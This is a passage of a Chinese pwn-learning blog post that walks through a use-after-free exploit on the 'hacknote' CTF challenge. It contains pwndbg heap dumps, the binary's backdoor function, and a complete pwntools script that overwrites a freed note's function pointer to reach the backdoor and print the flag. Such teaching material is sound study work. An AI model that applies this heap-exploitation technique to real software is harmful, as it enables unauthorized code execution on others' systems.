+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">Note size :8</span><br><span class="line">Content :aaaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure>
+<p>​		之后再看看 heap：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>
+<p>​		0x804b198 这个地址的 chunk 被重新拿去用了，第二次申请的那个原本存放了函数指针和字符串指针的那个 chunk 被分配了，之前拿去作为存放内容的那两个 chunk 一个都没有被分配，之后读一下这个地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0000000a61616161</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>​		发现这里被输入的字符给占了，再去读一下这个 0x804b1c8：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b1c8</span></span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br></pre></td></tr></table></figure>
+<p>​		这里没有啥变化，依旧是指向输出函数的地址，以及指向某字符串的地址，0x804b198 这个地址的 chunk 之前编号为 0，因为地址更低，更先被分配，这个地址更高的作为编号 1，同时整个程序存在 backdoor：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		所以只需要通过两次释放之后，再申请一个 0x8 之类比较小的，保证能够写入地址同时能够让分配到的 chunk 为同一个即可，然后申请的时候发送的数据为后门函数的地址即可，之后输出的时候它会自动调用后门程序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">30</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[*] Switching to interactive mode</span></span><br><span class="line"><span class="comment">#flag&#123;asd32as1-1d8g1r1hj5g4d4-9d54h3jyur4nfke1a&#125;</span></span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-11-05 11:51:20" itemprop="dateModified" datetime="2024-11-05T11:51:20+08:00">2024-11-05</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/540e5c20.html" title="Pwn学习笔记（10）--UAF">http://blog.g01den.top/posts/540e5c20.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/666fe8df.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;11&#x2F;03&#x2F;5dW8XfVzCkRBOAZ.jpg" title="【2024】强网杯">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> CTFer的比赛之路</span>
+  <h3>【2024】强网杯</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/f1497b96.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;11&#x2F;09&#x2F;1aRlLprxOQt8CoE.jpg" title="pwn学习笔记（11）--off_by_one">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（11）--off_by_one</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010uaf"><span class="toc-number">1.</span> <span class="toc-text"> Pwn 学习笔记（10）–UAF：</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li class="active"><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/666fe8df.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/f1497b96.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/e3418ca3.html" title="随机二次元图api相关">随机二次元图api相关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/a929fb97.html" title="【2023】LitCTF">【2023】LitCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/e20e7502.html" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/posts/3fe30769.html" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/c8624158.html" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/666fe8df.html" title="【2024】强网杯">【2024】强网杯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/88915f6f.html" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/540e5c20.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
